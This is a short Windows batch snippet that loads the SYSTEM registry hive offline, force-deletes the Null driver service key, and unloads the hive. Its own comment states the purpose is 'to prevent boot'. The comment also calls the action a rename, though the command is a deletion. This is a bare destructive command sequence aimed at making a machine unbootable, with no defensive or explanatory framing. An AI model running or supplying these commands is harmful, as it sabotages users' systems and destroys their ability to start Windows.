:: Rename the SYSTEM hive driver registry key to prevent boot
reg load HKLM\OFFSYSTEM C:\Windows\System32\config\SYSTEM
reg delete HKLM\OFFSYSTEM\ControlSet001\Services\Null /f
reg unload HKLM\OFFSYSTEM
